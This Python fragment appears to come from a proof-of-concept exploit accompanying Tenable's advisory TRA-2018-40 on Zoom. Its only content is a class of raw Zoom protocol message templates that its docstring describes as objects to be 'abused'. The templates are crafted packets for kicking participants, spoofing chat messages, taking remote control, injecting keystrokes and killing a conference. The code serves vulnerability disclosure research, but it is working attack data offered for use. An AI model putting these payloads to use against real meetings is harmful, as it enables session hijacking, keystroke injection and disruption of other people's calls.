# David Wells
# https://www.tenable.com/security/research/tra-2018-40
#

class Msg_Templates:
    '''
    Message Templates for Initializing Various Zoom Class Objects That We Will Be Abusing
    '''

    SSB_SDK_SS_HEADER = '{}\x0e\x01\x00\xfb\x90{}\x01\xfa\x08{}'
    SSB_SDK_CHAT_HEADER = '{}\x0e\x01\x00\xfb\x90\x00{}\x00\x04\x00\x88\x02\x01{}\x00{}\x00\x00\x00\x00{}\x00\x00\x00{}{}\x00\x00\x00\x00'
                         
    KICK_USER = ('{}\x0e\x01{}\x00\x04\x00\x01\x00\x04\x00\x88\x04{}{}\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00')   

    CHAT_MSG = ('\x07\x00\x00\x00Version'       # Version 
                '\x04\x00\x00\x001.00'          # 1.00
                '\x07\x00\x00\x00Content'       # Content
                '{}\x00\x00\x00{}'              # Msg
                '\x08\x00\x00\x00CChannel'      # CChannel
                '\x06\x00\x00\x00public'        # public
                '\t\x00\x00\x00Component'       # Component
                '\x04\x00\x00\x00Chat')         # Chat

    TAKE_CTRL = '{}_\x01{}\x00\x04\x03{}\x00\x04\x03\x04\x00\x00\x00\x00'
    HELO_KEYSTROKE = '{}_\x01{}\x00\x04\x03{}\x00{}\x03\x06\x00\x00\x00\x00'
    SEND_KEYSTROKE = '{}^\x01{}\x00\x04\x03\x00\x00\x00\x00$$\x00\x00\x00\xb6\xf2C{}e\x00\x00\x00"\x00\x00\x00{}\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x01\x00{}\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x13as_ctrl_info_sharer\x03\x00\x00{}\x00\x04\x03'
    HELO_VK = '{}\x0e\x01{}\x00\x04\x03{}\x00\x04\x03^\x01\x01\x00\x04\x03\x00\x00\x00\x00$$\x00\x00\x00\x0c\x81\x82\x02e\x00\x00\x00 \x00\x00\x00{}\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00Y3\x00\x00\x00\x00\x01\x00\x00\x00\x13as_ctrl_info_sharer\x03\x00\x00\x02\x00\x04\x03'
    SEND_VK = '{}^\x01{}\x00\x04\x03\x00\x00\x00\x00$$\x00\x00\x00\x82\x81\x82{}e\x00\x00\x00!\x00\x00\x00{}\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa0A\x12\x01\x00\x00\x00\x01\x00\x00\x00\x13as_ctrl_info_sharer\x03\x00\x00{}\x00\x04\x03'
    KILL_CONFERENCE = '{}\x0e\x01\x00\xfb\x90\x00\x01\xfa\x08\x00\x06\x01\x01\xfa\x08\x00\x00\x00\x00\x00\x00\x01\x92e\x00\x00\x00\x00\x00\x00\x00\x02\x01\xfa\x08\x00\x00\x00\x00\x01\x00\x00\x00\x01i\x03\x00\x00\x00\x00\x00\x01'